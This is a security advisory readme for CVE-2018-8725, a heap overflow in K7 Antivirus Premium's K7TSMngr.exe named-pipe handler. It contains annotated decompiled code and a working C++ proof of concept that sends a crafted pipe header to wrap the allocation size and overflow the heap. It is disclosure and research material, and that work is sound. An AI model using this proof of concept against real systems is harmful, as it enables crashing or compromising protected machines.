# CVE-2018-8725

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 16.0.0.0* 
* **Component**: *K7TSMngr.exe 16.0.0.70*
  * SHA256: E6655EBC79644E7DB6FC36B2D98DE88A9635F47B3ADF1D834FD357D5EA3E15A6

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details
Following on from the background piece above, in the top level pipe handler function there is a vulnerability in the header packet which can lead to a heap overflow:

# **TODO: MORE HERE? What message type, how much can it overflow, etc**


```C++
int __cdecl NamedPipeHandler(HANDLE dwBytesRead)
{
    // ... Locals ...

    bReturn = ReadFile(hPipe, &stInput, 0x1Cu, (LPDWORD)&dwBytesRead, 0);
    dwLastError = GetLastError();
    if ( bReturn || dwLastError == 234 )
    {
        // Sanity check that we are allowed to talk to the pipe... relatively simple to see the
        // checks and bypass them.
        if ( dwBytesRead == 0x1C
            && stInput.dwMagic == 0x4B375453
            && stInput.dwControlCode == 0x1010
            && stInput.dwInSize == 0x1C )
        {
            // This calculation here is overflowable. As an attacker, I own dwSizeToRead and 
            // dwOutputDataSize, and they are not checked for length at all. Therefore all I need
            // to do is make a situation where dwSizeToAlloc is less thatn stInput.dwSizeToRead.
            if ( (unsigned int)(stInput.dwSizeToRead + stInput.dwOutputDataSize + 36) <= 0x100000 )// VULN
            {
                dwSizeToAlloc = stInput.dwSizeToRead + stInput.dwOutputDataSize + 36;
                hProcessHeap = GetProcessHeap();
                // We allocate the data here...
                pBuffer = (PBYTE)HeapAlloc(hProcessHeap, 0, dwSizeToAlloc);
                if ( pBuffer )
                {
                    v8 = &pBuffer[stInput.dwSizeToRead];
                    if ( stInput.dwSizeToRead )
                    {
                        dwBytesRead = 0;
                        // pBuffer is (dwSizeToAlloc) bytes large. Therefire if this is smaller 
                        // than dwSizeToRead, we are going to overflow the heap.
                        bReturn_1 = ReadFile(hPipe_1, pBuffer, stInput.dwSizeToRead, (LPDWORD)&dwBytesRead, 0);
                        // ... 
                    }
                    // ...
                }
                // ...
            }
            // ...
        }
        // ...
    }
    // ...
}
```


# PoC Code
The following code simply demonstrates the buffer overflow which can be detected using a debugger, or setting up debug heaps on the process. This wasn't turned into anything further as it demonstrated the issue well enough for the development team to fix.

```C++
#include <Windows.h>
#include <stdio.h>

typedef struct unk1
{
	DWORD dwMagic;
	DWORD dwControlCode;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwSomeFunction;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
};

int wmain(int argc, wchar_t** argv)
{
	HANDLE hPipe = CreateFileW(L"\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return 0;
	}

    // This is the pipe message header packet.
	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwControlCode = 0x1010;
	u1.dwInSize = 28;

	// This combination of sizes means that theck will pass, and it will allocate 0 bytes, return a
	// valid pointer and we can overwrite by 0x10000 bytes. We can control how much will be
	// overwritten by changing the input size in this calculation.
	u1.dwInputDataSize = 0x10000;
	u1.dwOutputDataSize = 0xffffffff - 35 - u1.dwInputDataSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return 0;
	}

	// The second ReadFile will try to read 0x10000 bytes into a buffer that is 0 bytes, therefore
    // causing a buffer overflow.
	BYTE data[0x10000] = { 0 };
	memset(data, 0x41, sizeof(data));
	if (!WriteFile(hPipe, data, sizeof(data), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return 0;
	}
}


```

